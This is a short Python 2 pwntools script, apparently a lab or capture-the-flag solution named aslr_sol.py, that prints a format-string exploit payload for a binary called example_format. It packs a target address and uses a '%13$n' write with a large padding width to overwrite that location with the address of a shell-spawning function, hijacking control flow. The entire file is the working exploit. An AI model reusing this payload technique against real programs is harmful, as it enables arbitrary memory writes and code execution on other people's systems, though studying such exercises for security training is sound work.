#!/usr/bin/env python

from pwn import *

# ./example_format `./aslr_sol.py`
# Note we are not using the beginning of the string in this 
# exploit, but the first command line argument

addr = 0x0804a01c
shellAddr = 0x080484fb

output = ""

output += p32(addr)

output += " %" + str(shellAddr) +"x%13$n"

#output = p32(addr) + " ...%13$x"

print output
